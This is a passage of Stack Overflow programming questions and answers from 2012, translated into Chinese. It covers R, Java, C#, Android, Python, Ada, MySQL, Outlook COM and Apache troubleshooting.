当看到请求返回客户端时，响应中确实包含 csv 字符串，但客户端没有被提示或强制下载它。

这是解决这个问题的正确方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:35:50.960

不要使用 ajax 请求下载。做一个完整的 GET 请求。如果需要，请在新窗口中打开下载。

```
<a href="..." target="_blank">download file</a> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T14:41:39.793

我认为您使用 javascript 是因为动态 id 吗？如果您可以直接使用表格发布，请使用此类解决方案。如果确实需要 javascript，则使用这段代码来模拟表单操作：

```
$.download = function (url, data, method) {
    if (url && data) {
        //data can be string of parameters or array/object
        data = typeof data == 'string' ? data : jQuery.param(data).replace("\+", " ");
        data = data.replace(/\+/g, " ");
        var inputs = '';
        jQuery.each(data.split('&'), function () {
            var pair = this.split('=');
            inputs += '<input type="hidden" name="' + pair[0] + '" value="' + pair[1] + '" />';
        });
        //send request
        jQuery('<form action="' + url + '" method="' + (method || 'post') + '">' + inputs + '</form>')
        .appendTo('body').submit().remove();
    };
}; 
```

调用下载的代码（而不是ajax调用）：

```
path = '/api/export/id'
path = path.replace("id", foo.id)
$.download(path); 
```

# selector - 为 HtmlResponse 和 Response 抓取不同的 hxs 元素

> ID：13271808
> 
> 赞同：1
> 
> 时间：2012-11-07T14:31:16.657
> 
> 标签：selector, response, scrapy

我想从数据库中加载 url 地址并抓取每个页面。因此我尝试手动启动解析函数我的问题是，即使解析函数的响应属性与 HtmlResponse 调用的属性完全相同（两者：<200 url>），也会生成不同的 hxs：响应属性是：

```
 <HtmlXPathSelector xpath="None data=u'<html lang="de" dir="ltr" class="client-'> 
```

HtmlResponse-Attribute 的一个只是：

```
 <HtmlXPathSelector xpath="None data=u'<html> 
```

为什么是这样？

如果我尝试获取 Response(url) 我只会得到一个 AttributeError 称为：'Response' object has no attribute 'body_as_unicode'

感谢您的帮助

# r - 没有从本地 zip 安装 ggplot2

> ID：13271810
> 
> 赞同：0
> 
> 时间：2012-11-07T14:31:21.680
> 
> 标签：r, ggplot2

我使用的是 R 版本 2.15.1，但我不小心将 ggplot2 升级到了最新版本。现在我需要回滚到为 2.15.1 构建的 ggplot2 的最后一个版本。我已经从 Hadley 的 github repo 下载了 0.8.9 版，但我似乎无法安装它。运行 install.packages() 静默失败：

```
> install.packages("~/My Documents/ggplot2-ggplot2-0.8.9.zip", repos=NULL)
> require(ggplot2)
Loading required package: ggplot2
Warning message:
In library(package, lib.loc = lib.loc, character.only = TRUE, logical.return = TRUE,  :
  there is no package called ‘ggplot2’ 
```

这是使用 Hadley 解决同一问题的另一种方法`devtools`：

```
> install_version('ggplot2',version='0.8.9', repos='http://cran.us.r-project.org',type='win.binary') 
Installing ggplot2_0.8.9.tar.gz from http://cran.us.r-project.org/src/contrib/Archive/ggplot2/ggplot2_0.8.9.tar.gz
Installing ggplot2
C:/PROGRA~1/R/R-215~1.1/bin/i386/R --vanilla CMD build "C:\Documents and Settings\matthewfrost\Local Settings\Temp\RtmpcP0EzQ\ggplot2" --no-manual --no-resave-data 

* checking for file 'C:\Documents and Settings\matthewfrost\Local Settings\Temp\RtmpcP0EzQ\ggplot2/DESCRIPTION' ... OK
* preparing 'ggplot2':
* checking DESCRIPTION meta-information ... OK
* checking for LF line-endings in source and make files
* checking for empty or unneeded directories
* looking to see if a 'data/datalist' file should be added
* building 'ggplot2_0.8.9.tar.gz'
ERROR
packaging into .tar.gz failed
Error: Command failed (1)
In addition: Warning message:
running command '"C:/PROGRA~1/R/R-215~1.1/bin/i386/R" --vanilla CMD build "C:\Documents and Settings\matthewfrost\Local Settings\Temp\RtmpcP0EzQ\ggplot2" --no-manual --no-resave-data'     had status 1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:59:36.260

尝试：

```
install.packages("~/My Documents/ggplot2-ggplot2-0.8.9.zip", lib.loc="~/dev/foo/v1",repos=NULL, type= "source")

library(foo, lib.loc="~/dev/foo/v1") 
```

见[@Dirk Eddelbuettel](https://stackoverflow.com/questions/2988559/how-do-you-use-multiple-versions-of-the-same-r-package)

# mysql - 在 mysql admin 中编辑触发器

> ID：13271813
> 
> 赞同：0
> 
> 时间：2012-11-07T14:31:35.530
> 
> 标签：mysql

是否有任何语法可以在 mysql php myadmin db 中编辑特定触发器。我的数据库包含两个触发器，可以使用 'SHOW TRIGGERS' 访问它们。但是这个命令只给了我想要读取或编辑那个特定触发器的触发器，我该怎么做？我试过这个

```
SHOW CREATE TRIGGER 
```

但它没有向我显示有关触发器的完整信息，它只是给了我包含它创建的值的行。但如何编辑它请告诉我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:38:18.520

MySQL 中没有用于编辑触发器的语法。您需要先将其删除，然后再重新创建。此外，您还可以在 INFORMATION_SCHEMA.TRIGGERS 表中找到有关特定触发器的更多信息。

# java - 我如何弄乱我的 HttpGet 参数编码？

> ID：13271815
> 
> 赞同：0
> 
> 时间：2012-11-07T14:31:55.330
> 
> 标签：java, uri, http-get, apache-httpclient-4.x

我有这个 URL（可以在浏览器中执行）：

[https://api-test.company.com/contacts/?q=email=jlowder@company.com](https://api-test.company.com/contacts/?q=email=jlowder@company.com)

我正在尝试使用 HttpClient 来执行。我试过了：

```
 String URL = "https://api-test.company.com/contacts?q=" + URLEncoder.encode("email=jlowder@company.com");
    DefaultHttpClient client = new DefaultHttpClient();
    HttpGet c = new HttpGet(URL);
    HttpResponse response = client.execute(c);
    String resultContent = myRestCall.GetResponseText(response); 
```

这将返回错误：

QUERY_PARAM 无法解析查询字符串“email=jlowder@company.com”

我试过了：

```
 GetMethod method = new GetMethod("https://api-test.company.com/contacts/?q=");
    method.setQueryString(new NameValuePair[] {new NameValuePair("email", "jlowder@company.com")});
    HttpGet c = new HttpGet(method.toString());
    DefaultHttpClient client = new DefaultHttpClient();
    HttpResponse response = client.execute(c); 
```

返回：

java.lang.IllegalStateException：目标主机不能为空，或在参数中设置。

那么我究竟如何正确解析这个简单的 GET 请求呢？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:55:09.530

在您的示例中，您仍然有一个参数 q 也应该传递。通常，您有键/值。为什么会有这样的星座？

?q=email=jlowder@company.com

缺少“q”的值。或者你想将“email=jlowder@company.com”设置为“q”的值那么你应该转义“=”

# java - 可比类 Java

> ID：13271816
> 
> 赞同：1
> 
> 时间：2012-11-07T14:31:59.240
> 
> 标签：java, class, methods, comparable

我有这个类使用枚举类型作为甲板。使此类 Comparable 将卡片按升序排序的最有效方法是什么？如果它们是枚举类型，是否可以在一个方法中比较两个卡面值？（例如返回差异或什么？）谢谢。

```
public class Card {

public enum Rank {ACE, TWO, THREE, FOUR, FIVE, SIX, SEVEN, EIGHT, NINE, TEN, 
                    JACK, QUEEN, KING}
public enum Suit {CLUBS, DIAMONDS, HEARTS, SPADES}

private final Rank rank; 
private final Suit suit; 

private Card(Rank rank, Suit suit) {
    this.rank = rank;
    this.suit = suit;
}

public int compareTo(Card c) {
    Card aCard = (Card)c;
    int rankComparison = rank.compareTo(aCard.rank);
    return rankComparison != 0 ? rankComparison : suit.compareTo(aCard.suit);
}

public Rank rank(){
    return rank; 
}
public Suit suit(){
    return suit; 
}

public String toString(){ 
    return "The " + rank + " of " + suit + "."; 
}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:37:20.533

```
public int compareTo(Card c) {
    int rankComparison = rank.compareTo(c.rank);
    return rankComparison != 0 ? rankComparison : suit.compareTo(c.suit);
} 
```

试试这个，只是让类实现`Comparable`接口。请注意，枚举是按照它们声明的顺序进行比较的。

见， [http://docs.oracle.com/javase/6/docs/api/java/lang/Enum.html#compareTo](http://docs.oracle.com/javase/6/docs/api/java/lang/Enum.html#compareTo(E) (E )

要对此进行测试，您可以使用不同的卡编写 JUnit 测试，例如，

```
@Test
public void test()
{
    Card aceOfSpades = new Card(Rank.ACE, Suit.SPADES);
    Card fourOfClubs = new Card(Rank.FOUR, Suit.CLUBS);

    assertTrue(aceOfSpades.compareTo(fourOfClubs) > 0));
} 
```

# c# - 使用 Socket 连接到同一个端点

> ID：13271817
> 
> 赞同：1
> 
> 时间：2012-11-07T14:31:59.193
> 
> 标签：c#, sockets, client, endpoint, reconnect

我在客户端 TCP/IP 应用程序中使用[Socket](http://msdn.microsoft.com/en-us/library/system.net.sockets.socket%28v=vs.90%29.aspx)类将客户端连接到服务器。

我有以下代码：

```
var endPoint = new IPEndPoint(IPAddress.Parse(IP), port);
var client = new Socket(AddressFamily.InterNetwork, SocketType.Stream,
                        ProtocolType.Tcp);

client.Connect(endPoint);

try
{
    while (true)
    {
        // Do work...
        // Receive/Send data from/to server
    }
}
catch (SocketException)
{
    /* At some point the server disconnects...
    Exception catched because the server close the connection
    Socket error 10054 - WSAECONNRESET */

    // So I try to reconnect
    if(client.Connected == false)
    {
        /* The following line throws a InvalidOperationException.
        Message: After disconnecting the socket, you can reconnect only 
        asynchronously from a different EndPoint. BeginConnect must be 
        called on a thread that will not close until the operation completes.*/
        client.Connect(endPoint);   

        /* So I try instead Socket.BeginConnect, but the following line
        throws a SocketException 10061 - WSAECONNREFUSED */
        client.BeginConnect(endPoint, ConnectCallback, client);

        /* And also the following code throws a 
            SocketException 10061 - WSAECONNREFUSED */
        client = new Socket(AddressFamily.InterNetwork, SocketType.Stream,
                                ProtocolType.Tcp);
        client.Connect(endPoint);
    }
} 
```

[这里](http://msdn.microsoft.com/en-us/library/windows/desktop/ms740668%28v=vs.85%29.aspx)列出了套接字错误。

所以，在某些时候服务器关闭连接，我需要知道什么是最好的方法来知道服务器何时准备好接受另一个连接以及如何再次连接到同一个端点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:37:03.170

WSAECONNREFUSED 表示，服务器不接受您的连接请求。

您将不得不重试连接，并在重试之间休眠几秒钟。如果不尝试连接，客户端无法知道服务器何时再次可用。

# python - 防止 Ada DLL 中的名称错误

> ID：13271818
> 
> 赞同：3
> 
> 时间：2012-11-07T14:32:07.383
> 
> 标签：python, dll, ada, name-mangling

在创建 Ada DLL 时，是否有一种简单的方法可以防止 Ada 名称被破坏？

这是我的 .adb 代码

```
with Ada.Text_IO;
package body testDLL is
   procedure Print_Call is
   begin
      Ada.Text_IO.Put_Line("Hello World");
   end Print_Call;

   function Add_Nums(A,B : in Integer) return Integer is
   begin
      return A + B;
   end Add_Nums;

end testDLL; 
```

我的 .ads

```
package testDLL is
   procedure Print_Call;
   pragma export (dll, Print_Call, "Print_Call");

   function Add_Nums(A,B : in Integer) return Integer;
   pragma export (dll, Add_Nums, "Add_Nums");
end testDLL; 
```

我的蟒蛇

```
import ctypes

TestDLL = ctypes.WinDLL ("libTestDLL.dll")
Print_Call = getattr(TestDLL, "Print_Call@0")
Print_Call() 
```

您可以看到我必须在函数名称的末尾添加“@0”，但是当我将相同的代码移动到不同的编译器时，这似乎发生了变化。这给我带来了一些问题。我需要一个标准的修改格式或一种方法来一起删除修改。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-07T18:51:08.587

您可以通过编译指示的 Link_Name 和 External_Name 参数控制对象名称，如下所示：

```
pragma Export (C, Print_Call, "Print_Call", "Print_Call"); 
```

或者，如果您使用的是 Ada2012，您可以使用方面来指定这些：

```
function Add_Nums(A,B : in Integer) return Integer
    with Export, Convention => Ada, Link_Name => "Add_Nums"; 
```

以下涵盖了 Ada 的接口编译指示：http: [//www.ada-auth.org/standards/12rm/html/RM-J-15-5.html](http://www.ada-auth.org/standards/12rm/html/RM-J-15-5.html)

该线程涵盖了一些讨论，揭示了两者的差异： [https ://groups.google.com/forum/?fromgroups=#!searchin/comp.lang.ada/opengl/comp.lang.ada/6IVlMbtvrrU/mv3UUiDg5RwJ](https://groups.google.com/forum/?fromgroups=#!searchin/comp.lang.ada/opengl/comp.lang.ada/6IVlMbtvrrU/mv3UUiDg5RwJ)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T16:09:01.513

[显然](http://docs.adacore.com/gnat-unw-docs/html/gnat_rm_6.html#SEC347)（第 77 节）该约定`DLL`是 的同义词`StdCall`，据我了解，这会导致您报告的名称混乱。

你可以用约定做得更好`C`：

```
pragma Export (C, Print_Call, "Print_Call"); 
```

甚至

```
pragma Export (C, Print_Call); 
```

（但链接名称将小写，因此您需要更改 Python`getattr()`调用）。

我假设调用序列处理堆栈/参数的方式没有区别。

# android - 在带有 onKeyDown 和 KEYCODE_SEARCH 键的 HTC Desire 上显示键盘在显示后立即消失

> ID：13271819
> 
> 赞同：3
> 
> 时间：2012-11-07T14:32:10.650
> 
> 标签：android

我有一部 HTC Desire 手机，想在用户点击硬搜索[按钮](http://i.stack.imgur.com/kppV6.jpg)时显示设置焦点到输入字段并显示键盘。键盘在屏幕上显示后立即消失。

我已经`onKeyDown`用这段代码覆盖了：

```
public boolean onKeyDown(int key, KeyEvent event) {

    if (key == KeyEvent.KEYCODE_SEARCH) {
        EditText input = (EditText) findViewById(R.id.list_search_input);
        input.setText(null);

        input.requestFocus();

        // show keyboard
        InputMethodManager inputManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE); 
        inputManager.showSoftInput(input, 0);
     }

     return super.onKeyDown(key, event);
 } 
```

等待一些想法，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T08:44:41.690

尝试替换这个

```
return super.onKeyDown(key, event); 
```

有了这个：

```
return true; 
```

我认为这是因为您让默认 ( `super.onKeyDown(key, event);`) 事件处理程序被执行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T15:36:53.340

只是想知道如何编译它！您有一个公共布尔值，但没有返回值...尝试“return super.onKeyDown(key, event);” 在函数的最后！

# r - 读取文件时指定行名

> ID：13271820
> 
> 赞同：55
> 
> 时间：2012-11-07T14:32:13.727
> 
> 标签：r, csv, dataframe, rowname

我有一个`.txt`包含行名的文件。但是，R 将行名称设置为第一列。

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-11-07T14:36:06.323

如果您使用过`read.table()`（或其中一种，例如`read.csv()`），那么简单的解决方法是将调用更改为：

```
read.table(file = "foo.txt", row.names = 1, ....) 
```

`....`您需要/使用的其他参数在哪里。该`row.names`参数采用要从中获取行名的数据文件的列号。它不必是第一列。有关`?read.table`详细信息/信息，请参阅。

如果您已经在 R 中有数据并且懒得重新读取它，或者它来自另一条路线，只需设置`rownames`属性并从对象中删除第一个变量（假设`obj`是您的对象）

```
rownames(obj) <- obj[, 1]  ## set rownames
obj <- obj[, -1]           ## remove the first variable 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-07T14:33:50.290

见`?read.table`。基本上，当您使用 时`read.table`，您指定一个表示列的数字：

```
##Row names in the first column
read.table(filname.txt, row.names=1) 
```

# clojure - 其他 Clojure 项目源文件

> ID：13271823
> 
> 赞同：7
> 
> 时间：2012-11-07T14:32:16.713
> 
> 标签：clojure, leiningen

当 lein 建立一个项目时，会创建一个 core.clj 文件以及其他目录和文件。我想知道是否可以将 core.clj 的内容拆分到另一个源文件

`../myproj/src/myproj/`

如果是这样，如何从 core.clj 访问该数据。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T14:40:50.933

IIRC（我没有方便检查的项目），您`src/myproj/`目录中的所有内容都在`'myproj`命名空间中。所以你的`core.clj`文件将在命名空间中`'myproj.core`。其他文件将位于命名空间内的它们自己的命名`'myproj`空间中（例如`'myproj.other-file`for `other_file.clj`），并且可以通过以下方式拉入`core.clj`：

```
(use 'myproj.other-file) 
```

或者，在`ns`声明中：

```
(ns myproj.core
  (:use [myproj.other-file])) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:40:06.973

您可以将定义拆分到任意数量的文件中，尽管将单个命名空间放在单个文件中是惯用的，反之亦然。

有关如何命名和加载文件和命名空间的信息，请参见[http://clojure.org/libs 。](http://clojure.org/libs)要记住的一件事是，命名空间中的破折号转换为文件名中的下划线。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T16:48:49.340

Leiningen 的**project.clj**是定义一个**项目**var，它只不过是一个带有表示项目参数的键的映射（Clojure 中的一个习惯用法是使用*def[name]*创建一个名称为 [name] 的 var，*它*通常是一个映射 -最基本但非常有用的数据结构）。

有关默认值，请参见 Leiningen 2 源代码中的[defaults](https://github.com/technomancy/leiningen/blob/master/leiningen-core/src/leiningen/core/project.clj#L83) var。

话虽如此，在您调用[defproject](https://github.com/technomancy/leiningen/blob/master/leiningen-core/src/leiningen/core/project.clj#L170)宏之前，您可以在 project.clj 中做任何您想做的事情 - 毕竟它是一个 Clojure 脚本，您的想象力（以及对 Clojure 的熟悉程度）只是可能会限制您的因素。事实上，您可以在创建 var 后对它做任何您想做的事情。将 project.clj 视为管理项目的 Clojure 应用程序。

例如，在 Leiningen 2 中引入配置文件之前，有一个“技巧”可以让单个 var 具有 :dependencies 和 :dev-dependencies 属性的公共依赖项。再次警告您 - 在 Leiningen 2 中不再需要它，因为它提供了配置文件功能。如果您对过去的情况感到好奇，请阅读[针对 Clojure 的多个版本测试您的项目。](http://corfield.org/blog/post.cfm/testing-your-project-against-multiple-versions-of-clojure)

# android - 似乎无法更新表面覆盖中的文本视图

> ID：13271824
> 
> 赞同：2
> 
> 时间：2012-11-07T14:32:22.640
> 
> 标签：android, android-service, android-windowmanager

我创建了一个服务，如下所示。该服务创建了一个系统覆盖层，其中包含一个显示时间的文本视图。我有一个内联计时器类，它假设通过调用 Service 类的公共方法来用当前时间更新 textView。我知道它触发方法并通过我放置在方法中的日志传递新时间，但它只似乎第一次更改了文本视图中的文本。我认为这与未重绘的表面覆盖有关..任何人都知道如何解决这个问题，或者是否有可能：

```
public class cusNavOverrideService extends Service {

Timer timer;
WindowManager.LayoutParams handleParams;
WindowManager.LayoutParams clockParams;
View screenBlock;
View disableStatusBar;
WindowManager winMgr;
TextView clock;

@Override
public void onCreate() {

    winMgr = (WindowManager)getSystemService(WINDOW_SERVICE); 
}

@Override
public int onStartCommand(Intent intent, int flags, int startId) {

    disableStatusBar = new TableLayout(getApplicationContext());

     handleParams =  new WindowManager.LayoutParams(
             WindowManager.LayoutParams.FILL_PARENT,
             50,
             WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
             WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
             WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
             PixelFormat.TRANSPARENT);

     handleParams.gravity = Gravity.TOP;
     handleParams.y = 752;

     clockParams = new WindowManager.LayoutParams(
             WindowManager.LayoutParams.FILL_PARENT,
             50,
             WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
             WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
             WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
             WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
             WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
             PixelFormat.TRANSPARENT);

     clockParams.y = 752;

    disableStatusBar.setBackgroundResource(R.drawable.cust_bar);

     winMgr.addView(disableStatusBar, handleParams);

     Typeface tf = Typeface.createFromAsset(getApplicationContext().getAssets(), "fonts/Futura Bold.otf");
     clock = new TextView(getApplicationContext());
     clock.setTextColor(Color.BLACK);
     clock.setTextSize(30.0f);
     clock.setWidth(50);
     clock.setTypeface(tf);
     clock.setGravity(Gravity.TOP);
     clock.setGravity(Gravity.RIGHT);
     clock.setPadding(0, 5, 50, 0);

     winMgr.addView(clock, clockParams);

     timer = new Timer();
     uiCheckTask tTask = new uiCheckTask();
     tTask.setService(this);
     timer.schedule(tTask, 100, 200);

     return START_REDELIVER_INTENT;
}
public void updateClock(String newTime){

    Log.v("updateClock", "(((((((((((((((((((("+newTime+")))))))))))))))))");
    clock.setText(newTime);

}
@Override
public IBinder onBind(Intent intent) {
    // We don't provide binding, so return null
    return null;
}

@Override
public void onDestroy() {
    timer.cancel();
    winMgr.removeView(disableStatusBar);
  //Toast.makeText(this, "service done", Toast.LENGTH_SHORT).show(); 
}

class uiCheckTask extends TimerTask {

    cusNavOverrideService myService;
    String newTime;
    String tempTime;
    Time cTime; 
    String displayTime;

   public void setService(cusNavOverrideService service){
       myService = service;
       cTime= new Time(Time.getCurrentTimezone());
   }

    public void run() {

        try {

            cTime.setToNow();
            displayTime = cTime.format("%I:%M%P");

            if(displayTime.startsWith("0")){
               //displayTime ="CHUCK";
                newTime = displayTime.substring(1);
            }else{
                newTime = displayTime;
            }
            myService.updateClock(newTime);
        }
        catch(Exception ex)
        {
            Log.v("WINDOW CHANGE", "exemption:"+ex);
        }

    }

} 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T15:48:13.057

Timer 在它自己的线程中运行，并且只允许 UI 线程更新可见的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T16:12:16.767

我使用的解决方案是创建一个处理程序而不是 timerTask

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-07-12T14:56:06.227

我的视图没有消失和重新出现，我遇到了同样的问题。它必须与您（我们）使用 WindowManager.addView(...) 添加视图这一事实有关。一切正常，只是没有更新。也许无效？

# air - 哪里可以知道 Adob e Air CSS 支持的情况？

> ID：13271826
> 
> 赞同：0
> 
> 时间：2012-11-07T14:32:25.417
> 
> 标签：air, adobe

`img`我想将我的图像变灰，但是当我将标签设置为 CSS 样式时，我发现它不起作用`filter: grayscale(10%)`。

Air 支持`filter: grayscale(10%)`or`-webkit-filter: grayscale(10%)`吗？

是否有任何帖子告诉 Air 支持哪些 CSS 属性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:44:39.700

在图像或图形上设置`UIComponent.blendMode`or`GraphicElement.blendMode`属性。`"luminosity"`

此方法通过将图像中的颜色与图像“背后”的颜色（通常是父容器或应用程序的背景颜色）混合来工作。

所以如果图像背后的颜色是白色或浅灰色，那么图像就会变成灰色。如果后面的颜色是绿色，那么图像将被着色为绿色

# c# - Outlook COMException

> ID：13271829
> 
> 赞同：4
> 
> 时间：2012-11-07T14:32:31.803
> 
> 标签：c#, com, outlook, outlook-2010, comexception

System.Runtime.InteropServices.COMException ..您的服务器管理员限制了您可以同时打开的项目数量...

在 Microsoft.Office.Interop.Outlook._AppointmentItem.get_UserProperties()

```
 var calendar = outlookApplication.GetNamespace("MAPI").GetDefaultFolder(OlDefaultFolders.olFolderCalendar);

        if (calendar == null || calendar.Items == null)
        {
            return null;
        }

        var calendarItems = calendar.Items;

        if (calendarItems != null && calendarItems.Count > 0)
        {
            // Dont convert to LINQ or foreach please -> may cause Outlook memory leaks. 
            for (int counter = 1; counter <= calendarItems.Count; counter++)
            {
                var appointment = calendarItems[counter] as AppointmentItem;

                if (appointment != null)
                {
                    var userProperty = appointment.UserProperties.Find("myInformation");

                    if (userProperty != null && userProperty.Value == myValue)
                    {
                        return appointment ;
                    }
                }
            }
        } 
```

也许它的约会.UserProperties.Find("myInformation") 导致 COMException？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T14:07:04.033

您需要确保在使用完 Outlook 项目后立即发布它们，`Marshal.ReleaseComObject()`而不是等待垃圾收集器启动。

您还需要避免使用多个点表示法，以确保您不会获得包含中间结果且无法显式引用和释放的隐式变量（由编译器创建）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-05-23T14:52:49.227

完成 Outlook Mailitem 后关闭它然后释放它

```
For Each item As Outlook.MailItem In oFolder.Items
  '<process item code>

  'Close the item
    'SaveMode Values
    'olDiscard  = 1
    'olPromptForSave = 2
    'olSave = 0
  item.Close(1)

  'Release item
  Marshal.ReleaseComObject(item)
Next 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-02T07:22:34.423

我已经找到了解决方案。没有必要使用`Find`原因`Restrict`来制作我需要的东西。

```
...
string filter = string.Format("[myInformation] = '{0}'", myInformation);
var calendarItems = calendar.Items.Restrict(filter);
... 
```

# r - 如何检查原子向量中的某个数值是否高于 20%

> ID：13271832
> 
> 赞同：-1
> 
> 时间：2012-11-07T14:32:39.603
> 
> 标签：r

我有一个原子向量，想要过滤掉所有得分高于 20% 的行。数据如下所示：

```
 Gain
ch1_500001  0.0000000
ch1_1500001 0.0000000
ch1_2500001 0.3157895
ch1_3500001 0.1578947
ch1_4500001 0.1578947
ch1_5500001 0.1578947 
```

所以我希望选择 ch1_2500001。

我尝试了几种选择：

`freqsnormg<- freqsnorm==0.20` 只给出 FALSE

`freqsnormg<- freqsnorm[,1]==0.20`只给出 FALSE

如何获得仅包含 20% 以上值的新表。并且不要更改逻辑中的值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:36:03.923

查看高于 20% 的值

```
freqsnormg<- freqsnorm[freqsnorm[,1]>0.20, ] 
```

查看低于 20% 的值

```
freqsnormg<- freqsnorm[freqsnorm[,1]<0.20, ] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:37:26.150

你的问题真的没有意义，你提到词向量，然后显示一个数据框。

1.  如果你想过滤掉一个叫做then的**向量的值：**`freqsnorm`

    ```
    freqsnorm[freqsnorm < 0.20] 
    ```

2.  您的数据看起来像一个**数据框**，因此您需要一个逗号来选择行：

    ```
    ##Here freqsnorm[,1] selects the first column
    freqsnorm[freqsnorm[,1] < 0.20]
    ##Refer to the column by name
    freqsnorm[freqsnorm$Gain < 0.20] 
    ```

在这两种情况下，方括号中的部分都会给你一个逻辑向量，即：

```
freqsnorm$Gain < 0.20 
```

将返回 TRUE、TRUE、FALSE 等。然后我们使用方括号选择我们想要的元素。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T14:39:10.300

如果您正在处理`data.frame`尝试：

```
freqsnormg <- read.table(text='                 Gain
ch1_500001  0.0000000
ch1_1500001 0.0000000
ch1_2500001 0.3157895
ch1_3500001 0.1578947
ch1_4500001 0.1578947
ch1_5500001 0.1578947', header=T)

subset(freqsnormg, Gain>.2)  # above 20%
                 Gain
ch1_2500001 0.3157895

subset(freqsnormg, Gain<.2)  # below 20%
                 Gain
ch1_500001  0.0000000
ch1_1500001 0.0000000
ch1_3500001 0.1578947
ch1_4500001 0.1578947
ch1_5500001 0.1578947 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-07T14:42:36.613

您显示的数据**不是**原子向量（组件`Gain`很可能*是*原子向量，但完整对象不是）。

一种选择是使用`subset()`. 使用您的数据

```
df <- read.table(text = "                 Gain
ch1_500001  0.0000000
ch1_1500001 0.0000000
ch1_2500001 0.3157895
ch1_3500001 0.1578947
ch1_4500001 0.1578947
ch1_5500001 0.1578947", header = TRUE) 
```

我们有

```
> subset(df, Gain > 0.2)
                 Gain
ch1_2500001 0.3157895 
```

如果你想强制它下降到一个向量（即松开空维度）然后

```
> subset(df, Gain > 0.2)[,1]
[1] 0.3157895 
```

# python - 使用 __getattr__(self, name) 访问实例的其他属性

> ID：13271836
> 
> 赞同：8
> 
> 时间：2012-11-07T14:33:00.260
> 
> 标签：python, object, attributes

在 Python 的[文档中，在`__getattr__`函数](http://docs.python.org/2/reference/datamodel.html#object.__getattr__)上它说：

> 请注意，如果通过正常机制找到该属性，则不会调用 __getattr__()。（这是 __getattr__() 和 __setattr__() 之间的故意不对称。）这样做是出于效率原因，并且因为否则 __getattr__() 将无法访问实例的其他属性。

我在理解最后一条语句时遇到问题：

> 将无法访问实例的其他属性

它究竟如何无法访问其他属性？（我想它与无限递归有关，但没有其他方法可以访问实例属性，比如直接访问`self.__dict__`？）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T14:46:56.047

如果您尝试使用`self.__dict__[key]`as`self.__dict__`会调用`__getattr__`等，您将有无限递归。当然，如果您使用 ，您可以打破这个循环`object.__getattr__(self,key)`，但这*仅适用于新样式类*。没有可用于*旧样式*类的通用机制。

请注意，您没有这个问题，`__setattr__`因为在这种情况下，您*可以*直接使用`self.__dict__`（因此不对称）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:41:16.810

法宝是一`__getattribute__()`对`__setattr__()`，但力量越大，责任越大。 `__getattr__()`提供这样您就不必承担很大的责任部分。正如@mgilson 在评论中指出的那样，如果`__getattr__()`按原样`__getattribute__()`工作，您将无法从内部访问实例的任何属性`__getattr__()`，因为即使查看`self.__dict__`您也需要使用属性查找机制。

# php - apache/php 挂起：semop？

> ID：13271837
> 
> 赞同：1
> 
> 时间：2012-11-07T14:33:00.353
> 
> 标签：php, apache, php-5.2

我正在编写一个 wordpress 插件来包含一个定制的单点登录。

我有一个无法重现的问题，但它经常发生：有时您登录，单击另一个页面，该页面会一直加载。来自同一会话的所有其他请求也将从此时卡住。重新启动 apache 可以修复它，但不是真正的解决方案。

服务器没有很多流量，所以只有几个 apache 进程在运行。如果我深入研究它们，我会看到很多人坚持`semop`：

```
(gdb) bt
#0  0x00002af60c22b2d7 in semop () from /lib64/libc.so.6
#1  0x00002af60bbf612c in ?? () from /usr/lib64/libapr-1.so.0
#2  0x000055555559e614 in ?? () from /usr/sbin/httpd2-prefork
#3  0x000055555559e9ea in ?? () from /usr/sbin/httpd2-prefork
#4  0x000055555559f25d in ap_mpm_run () from /usr/sbin/httpd2-prefork
#5  0x000055555557a080 in main () from /usr/sbin/httpd2-prefork 
```

看起来他们正在等待一个文件：

```
strace -p 3069
....
read(7, 0x7fff16a04df7, 1)              = -1 EAGAIN (Resource temporarily unavailable)
semop(286162952, 0x2af60bd07dc0, 1 <unfinished ...> 
```

